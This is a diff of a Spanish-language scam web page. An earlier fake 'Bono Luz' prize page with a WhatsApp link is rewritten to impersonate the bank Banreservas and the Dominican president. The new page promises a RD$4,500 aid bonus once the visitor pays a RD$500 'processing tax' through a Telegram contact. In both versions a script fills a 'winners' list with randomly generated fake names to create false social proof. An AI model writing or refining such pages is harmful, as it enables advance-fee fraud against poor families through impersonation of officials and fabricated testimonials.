@@ -2,110 +2,104 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Bono Luz RD$2,500</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bono de Ayuda - Banreservas</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #f4f9ff;
+      font-family: 'Georgia', serif;
+      background-color: #f2f7ff;
       margin: 0;
       padding: 0;
-      color: #2c3e50;
+      color: #222;
     }
 
     header {
-      background: #0074c2;
-      color: white;
+      background-color: #0033a0;
+      color: #fff;
       text-align: center;
-      padding: 40px 20px;
-      position: relative;
+      padding: 30px 15px;
     }
 
     header h1 {
       margin: 0;
-      font-size: 30px;
+      font-size: 28px;
     }
 
-    .highlight {
-      font-weight: bold;
-      color: #ffff99;
-      font-size: 1.2em;
+    header p {
+      margin: 10px 0 0;
+      font-size: 16px;
     }
 
     .container {
+      max-width: 700px;
+      margin: 40px auto;
       padding: 20px;
-      max-width: 800px;
-      margin: auto;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
 
-    button {
-      background-color: #0074c2;
+    .amount {
+      color: green;
+      font-size: 24px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .message {
+      font-size: 17px;
+      line-height: 1.6;
+      margin-top: 15px;
+    }
+
+    .btn {
+      display: block;
+      background-color: #0088cc;
       color: white;
-      border: none;
-      padding: 15px 25px;
+      padding: 15px;
+      margin: 25px auto;
+      text-align: center;
       font-size: 18px;
       border-radius: 8px;
-      cursor: pointer;
-      width: 100%;
-      margin: 20px 0;
+      text-decoration: none;
+      max-width: 300px;
     }
 
-    .winners-section {
-      margin-top: 40px;
+    .winners {
+      margin-top: 30px;
     }
 
-    .winners-section h2 {
+    .winners h2 {
       text-align: center;
-      font-size: 22px;
+      font-size: 20px;
     }
 
-    .winners-list {
-      background: white;
-      border-radius: 8px;
+    .winner-list {
+      max-height: 300px;
+      overflow-y: auto;
+      background: #fafafa;
+      border: 1px solid #ccc;
+      border-radius: 6px;
       padding: 15px;
-      height: 300px;
-      overflow-y: scroll;
       font-size: 14px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
     .winner {
-      padding: 6px 0;
+      padding: 5px 0;
       border-bottom: 1px solid #eee;
     }
 
-    /* Logo animado de energía */
-    .logo {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      width: 50px;
-      height: 50px;
-      border-radius: 50%;
-      background: radial-gradient(circle, #ffff33 30%, #ffaa00 60%, #ffcc00 90%);
-      animation: pulse 1.5s infinite ease-in-out;
-    }
-
-    .logo::after {
-      content: "⚡";
-      font-size: 26px;
-      position: absolute;
-      top: 10px;
-      left: 12px;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.15); opacity: 0.8; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-
     @media screen and (max-width: 600px) {
-      header h1 {
-        font-size: 24px;
+      .container {
+        margin: 20px;
       }
-      button {
-        font-size: 16px;
+
+      header h1 {
+        font-size: 22px;
+      }
+
+      .amount {
+        font-size: 20px;
       }
     }
   </style>
@@ -113,44 +107,48 @@
 <body>
 
   <header>
-    <div class="logo"></div>
-    <h1>🎉 ¡Felicidades!</h1>
-    <p class="highlight">Eres el ganador del <strong>Bono Luz</strong> de <strong>RD$2,500</strong></p>
-    <p>Tu bono de <strong>RD$2,500</strong> está disponible. Solo debes cubrir los impuestos de importación y trámite legal con el abogado autorizado.</p>
+    <h1>Banreservas</h1>
+    <p>¡Ayuda solidaria para nuestro pueblo dominicano!</p>
   </header>
 
   <div class="container">
-    <a href="https://wa.me/18296337718" target="_blank">
-      <button>Reclamar Bono por WhatsApp</button>
-    </a>
+    <div class="amount">RD$4,500</div>
+    <div class="message">
+      El presidente <strong>Luis Abinader</strong> ha dispuesto la entrega de un bono de ayuda solidaria
+      para las familias dominicanas más necesitadas, con un monto de <strong>cuatro mil quinientos pesos</strong>.
+      <br><br>
+      Esta medida busca aliviar la carga económica en tiempos difíciles, y cuenta con el respaldo de iniciativas
+      institucionales lideradas por figuras como el expresidente <strong>Leonel Fernández</strong>.
+      <br><br>
+      Para recibir tu bono, debes cubrir un impuesto de procesamiento y aduana por RD$500 conforme a los lineamientos establecidos por el Estado dominicano.
+    </div>
 
-    <div class="winners-section">
-      <h2>📑 Más de 100 personas ya reclamaron su bono:</h2>
-      <div class="winners-list">
-        <!-- Lista de ganadores -->
-        <div class="winner"><strong>Pedro Ramírez</strong> - Cristo Rey - NIC: 7411562</div>
-        <div class="winner"><strong>Lucía Mejía</strong> - Gualey - NIC: 8337123</div>
-        <div class="winner"><strong>Angela Herrera</strong> - Sabana Perdida - NIC: 7743109</div>
-        <!-- Auto-generados -->
-        <script>
-          const list = document.querySelector('.winners-list');
-          const sectores = ['Villa Juana', 'Los Mina', 'Cristo Rey', 'Sabana Perdida', 'Villa Mella', 'Capotillo', 'Ensanche Ozama', 'La Puya', 'Gazcue', 'Los Ríos'];
-          const nombres = ['Ana', 'Luis', 'Pedro', 'Laura', 'José', 'Carmen', 'María', 'Carlos', 'Rosa', 'Juan', 'Elena', 'Miguel', 'Lucía', 'Santiago', 'Daniela', 'Ramón'];
-          const apellidos = ['Pérez', 'Gómez', 'Ramírez', 'Martínez', 'López', 'Fernández', 'Santos', 'Cruz', 'Rodríguez', 'Morales'];
-          for (let i = 0; i < 90; i++) {
-            const nombre = nombres[Math.floor(Math.random() * nombres.length)];
-            const apellido = apellidos[Math.floor(Math.random() * apellidos.length)];
-            const sector = sectores[Math.floor(Math.random() * sectores.length)];
-            const nic = Math.floor(Math.random() * 8999999) + 1000000;
-            const div = document.createElement("div");
-            div.className = "winner";
-            div.innerHTML = `<strong>${nombre} ${apellido}</strong> - ${sector} - NIC: ${nic}`;
-            list.appendChild(div);
-          }
-        </script>
+    <a href="https://t.me/licenciadovictor" target="_blank" class="btn">Retirar Bono</a>
+
+    <div class="winners">
+      <h2>Beneficiarios que ya recibieron su bono</h2>
+      <div class="winner-list" id="winner-list">
+        <!-- Lista generada por JavaScript -->
       </div>
     </div>
   </div>
+
+  <script>
+    const nombres = ["Carlos", "Ana", "Luis", "María", "José", "Elena", "Pedro", "Lucía", "Ramón", "Carmen"];
+    const apellidos = ["Pérez", "Santos", "Ramírez", "Gómez", "Rodríguez", "Fernández", "Morales", "López"];
+    const ciudades = ["Santo Domingo", "Santiago", "La Vega", "San Cristóbal", "San Pedro", "Higüey", "Moca", "Baní", "Azua", "Bonao"];
+    const lista = document.getElementById("winner-list");
+
+    for (let i = 0; i < 100; i++) {
+      const nombre = nombres[Math.floor(Math.random() * nombres.length)];
+      const apellido = apellidos[Math.floor(Math.random() * apellidos.length)];
+      const ciudad = ciudades[Math.floor(Math.random() * ciudades.length)];
+      const div = document.createElement("div");
+      div.className = "winner";
+      div.innerText = `${nombre} ${apellido} - ${ciudad}`;
+      lista.appendChild(div);
+    }
+  </script>
 
 </body>
 </html>
